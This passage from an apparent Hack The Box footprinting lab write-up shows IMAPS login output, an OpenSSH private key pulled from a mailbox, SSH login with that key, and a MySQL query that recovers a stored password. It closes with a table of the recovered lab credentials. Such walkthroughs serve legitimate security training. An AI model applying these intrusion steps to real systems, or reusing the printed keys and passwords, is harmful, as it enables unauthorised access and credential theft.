Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1283 bytes and written 1740 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 2FC4FC707C87C4F47009FCC71BB275258DF3CBC68F988AA74559BD321C8F579F
    Session-ID-ctx: 
    Resumption PSK: 00B318D9E2F7BC0128FD094FD85BB0E55F64BA86AD80F51CD71326D51E9C8AD0BF9519345A3C553593558E81667F9C31
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d4 ea b0 a8 97 49 4c 57-90 f5 0a 7a 86 4c ee 4a   .....ILW...z.L.J
    0010 - 3a 57 0c 1b 1b e2 ef 3a-54 24 4a 9f 51 6b ca 55   :W.....:T$J.Qk.U
    0020 - 09 06 4b 45 8a 2a 08 9a-5f 89 3a 58 65 88 89 22   ..KE.*.._.:Xe.."
    0030 - 7a 22 ea 48 e8 fa 04 02-3d 8c 28 3a 91 fe c6 73   z".H....=.(:...s
    0040 - c9 f3 cf 2c a2 2b 6b c7-75 d7 96 24 7b 33 be 85   ...,.+k.u..${3..
    0050 - d5 76 50 f5 13 a4 1c bf-f2 d3 28 7d b5 db 40 e0   .vP.......(}..@.
    0060 - 6f 63 4c 8a 48 6b 48 c0-7a c6 d0 61 9b 90 ec 38   ocL.HkH.z..a...8
    0070 - cc 35 80 e0 a2 55 bc 1b-b0 b3 15 8f 4c 28 c6 ad   .5...U......L(..
    0080 - ca 48 6a fb 08 fe 60 a5-93 22 57 d0 96 bf 9e e9   .Hj...`.."W.....
    0090 - e8 2e d1 97 cd 73 ae a0-cd 73 a7 4c 0c c6 ec 87   .....s...s.L....
    00a0 - fa c5 61 73 3d 4d 95 09-9c 79 03 04 29 fa 89 58   ..as=M...y..)..X
    00b0 - 11 53 2d 0e 6a c2 0b 06-fe 59 47 46 3e cb 05 20   .S-.j....YGF>.. 

    Start Time: 1774080642
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 086787ED3742F99BA030A122EB17A9E51C3A5F34F21A69651516C19945044FBC
    Session-ID-ctx: 
    Resumption PSK: 26D3A66C1141422206BCE6569A231DFAD26D396DB815660C7EAB52CD5F76BF2581DD66BF205574B68D04BA9D39F52407
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - d4 ea b0 a8 97 49 4c 57-90 f5 0a 7a 86 4c ee 4a   .....ILW...z.L.J
    0010 - 65 70 9c 87 3c 36 77 a6-b5 b7 3d 40 fc 7c ca 32   ep..<6w...=@.|.2
    0020 - 3e 9d 65 b3 b3 aa e3 8f-01 3a 6c 0c 52 58 f7 3a   >.e......:l.RX.:
    0030 - 01 a4 0c 72 9b 7e 6f f6-f7 1a ab 94 9a 01 68 81   ...r.~o.......h.
    0040 - f1 c4 65 f7 b4 8c 22 eb-f2 a7 e7 9b 48 77 4f 7c   ..e...".....HwO|
    0050 - 2e 62 81 47 87 d2 ae 57-98 56 66 02 87 c2 bc 3c   .b.G...W.Vf....<
    0060 - 6d 81 1b 23 4a 6a 93 3b-00 50 5b c2 7a d1 64 5b   m..#Jj.;.P[.z.d[
    0070 - 68 bd b3 4d 15 c7 c5 15-26 ec 4a 84 76 0b 84 93   h..M....&.J.v...
    0080 - 26 4c 85 16 ff 73 92 fe-87 f2 a9 3e 2c 2d 79 7e   &L...s.....>,-y~
    0090 - e7 28 40 38 ed f8 0d c6-20 80 7d 71 56 25 0c 01   .(@8.... .}qV%..
    00a0 - aa c1 57 43 12 20 8b 7a-ac 52 89 26 66 8a 5d d4   ..WC. .z.R.&f.].
    00b0 - cb f3 0d 83 46 91 ef 6f-cf a7 23 d0 65 01 ca 2b   ....F..o..#.e..+

    Start Time: 1774080642
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
1 LOGIN tom NMds732Js2761

1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
* BAD Error in IMAP command : Unknown command (0.001 + 0.000 secs).
A01 SELECT INBOX
* LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
* OK List completed (0.008 + 0.000 + 0.007 secs).
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
A01 OK [READ-WRITE] Select completed (0.007 + 0.000 + 0.006 secs).
A02 FETCH 1 (BODY[HEADER.FIELDS (SUBJECT FROM DATE)])
* 1 FETCH (BODY[HEADER.FIELDS (SUBJECT FROM DATE)] {95}
From: [Admin] <tech@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

)
A02 OK Fetch completed (0.006 + 0.000 + 0.005 secs).
A03 FETCH 1 BODY[TEXT]
* 1 FETCH (BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
)
A03 OK Fetch completed (0.001 + 0.000 secs).

```

- The body of message #1 was fetched, revealing an **OpenSSH Private Key**.

### Gaining a Foothold (SSH)

With the OpenSSH private key. I can use it as a way to login ssh with tom user !

Following command help me with that

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ nano id_rsa
 # right here you copy from                                                                                  -----BEGIN OPENSSH PRIVATE KEY-----
 #to                 -----END OPENSSH PRIVATE KEY-----
                         
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ chmod 600 id_rsa            # Secure permissions          
┌──(kali㉿kali)-[~/Downloads/HTB/footprinting/finallab]
└─$ ssh -i id_rsa tom@10.129.29.150

```

### Data Exfiltration on MySql

First i check out the .bash_history to see if there is any command or interesting thing that tom did…

```bash
tom@NIXHARD:~$ cat .bash_history 
mysql -u tom -p
ssh-keygen -t rsa -b 4096
ls
ls -al
cd .ssh/
ls
cd mail/
ls
ls -al
cd .imap/
ls
cd Important/
ls
set term=xterm
vim key
cat ~/.ssh/id_rsa
vim key
ls
mv key ..
cd ..
ls
mv key Important/
mv Important/key ../
cd ..
ls
ls -l
id
cat /etc/passwd
ls
cd mail/
ls
ls -al
cd mail/
ls
rm Meetings 
rm TESTING Important 
ls -l
cd ..
ls -al
mv mail/key Maildir/.Important/new/
mv Maildir/.Important/new/key Maildir/new/
cd Maildir/new/
ls
cd ..
tree .
cat cur/key
cd cur/
ls
ls -al
cat "key:2,"
mysql -u tom -p 
mysql -u tom -p

```

Oh here we have mysql is running !

By querying the `users` table in the `users` database, the final target credentials were recovered.

```bash
tom@NIXHARD:~$ mysql -u tom -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
ERROR 1046 (3D000): No database selected
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * From users where username = 'HTB'
    -> ;
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)

mysql> 

```

Password : cr3n4o7rzse7rzhnckhssncif7ds 

| **Field** | **Value** |
| --- | --- |
| **System User** | tom |
| **IMAP/SSH Password** | NMds732Js2761 |
| **HTB Database Entry** | cr3n4o7rzse7rzhnckhssncif7ds |